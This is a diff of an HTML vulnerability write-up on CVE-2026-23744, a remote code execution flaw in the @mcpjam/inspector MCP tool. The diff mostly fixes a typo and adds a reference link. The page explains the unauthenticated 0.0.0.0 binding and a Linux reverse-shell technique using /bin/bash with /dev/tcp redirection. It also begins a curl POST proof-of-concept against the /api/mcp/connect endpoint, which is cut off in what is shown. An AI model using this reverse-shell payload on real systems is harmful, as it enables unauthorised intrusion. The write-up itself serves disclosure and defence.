@@ -374,10 +374,10 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#vulnerability-descrption" class="md-nav__link">
+  <a href="#vulnerability-description" class="md-nav__link">
     <span class="md-ellipsis">
       <span class="md-typeset">
-        Vulnerability descrption
+        Vulnerability description
       </span>
     </span>
   </a>
@@ -530,10 +530,10 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#vulnerability-descrption" class="md-nav__link">
+  <a href="#vulnerability-description" class="md-nav__link">
     <span class="md-ellipsis">
       <span class="md-typeset">
-        Vulnerability descrption
+        Vulnerability description
       </span>
     </span>
   </a>
@@ -679,7 +679,7 @@
 </tr>
 </tbody>
 </table>
-<h2 id="vulnerability-descrption">Vulnerability descrption<a class="headerlink" href="#vulnerability-descrption" title="Permanent link">&para;</a></h2>
+<h2 id="vulnerability-description">Vulnerability description<a class="headerlink" href="#vulnerability-description" title="Permanent link">&para;</a></h2>
 <p><strong>CVE-2026-23744</strong> is a critical remote code execution (RCE) flaw discovered within the <code>@mcpjam/inspector</code> utility, a local-first development platform for Model Context Protocol (MCP) servers. The flaw is primarily caused by an insecure default configuration combined with missing authorisation controls on a critical functional component (CWE-306). By default, the utility binds its HTTP listening server globally to all network interfaces (<code>0.0.0.0</code>) rather than restricting traffic internally via the loopback address (<code>127.0.0.1</code>): 
 <div class="language-javascript highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="kd">const</span><span class="w"> </span><span class="nx">server</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">serve</span><span class="p">({</span>
 </span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="w">    </span><span class="nx">fetch</span><span class="o">:</span><span class="w"> </span><span class="nx">app</span><span class="p">.</span><span class="nx">fetch</span><span class="p">,</span>
@@ -705,7 +705,7 @@
 </ol>
 <h2 id="exploitation-linux-deployment">Exploitation - Linux deployment<a class="headerlink" href="#exploitation-linux-deployment" title="Permanent link">&para;</a></h2>
 <p>While public exploit code and disclosures traditionally focus on Windows environments (using <code>cmd.exe /c</code>), testing indicates that the underlying execution block parses system commands via default Linux shells natively.</p>
-<p>On a Linux runtime environment, an attacker can exploit the missing verification boundary by structuring a payload to invoke <code>==/bin/bash==</code> along with a standard file-descriptor redirection sequence (<code>&gt;&amp; /dev/tcp/</code>), achieving an interactive reverse shell callback over the network.</p>
+<p>On a Linux runtime environment, an attacker can exploit the missing verification boundary by structuring a payload to invoke <code>bin/bash</code> along with a standard file-descriptor redirection sequence (<code>&gt;&amp; /dev/tcp/</code>), achieving an interactive reverse shell callback over the network.</p>
 <h3 id="proof-of-concept_1">Proof-of-Concept<a class="headerlink" href="#proof-of-concept_1" title="Permanent link">&para;</a></h3>
 <p>An RCE attack can be initialised by transmitting a structured HTTP <code>POST</code> request directly to the target network socket containing the Linux execution payload:
 <div class="language-shell highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>curl<span class="w"> </span>http://&lt;TARGET_LINUX_IP&gt;:6274/api/mcp/connect<span class="w"> </span><span class="se">\</span>
@@ -729,6 +729,7 @@
 <p>The analysis detailed in this post was compiled by referencing the official security advisories and documentation detailed below.</p>
 <ul>
 <li><a href="https://github.com/advisories/GHSA-232v-j27c-5pp6">https://github.com/advisories/GHSA-232v-j27c-5pp6</a></li>
+<li><a href="https://github.com/MCPJam/inspector/commit/e6b9cf9d9e6c9cbec31493b1bdca3a1255fe3e7a">https://github.com/MCPJam/inspector/commit/e6b9cf9d9e6c9cbec31493b1bdca3a1255fe3e7a</a></li>
 </ul>
 <div class="admonition warning">
 <p class="admonition-title">AI generated content</p>
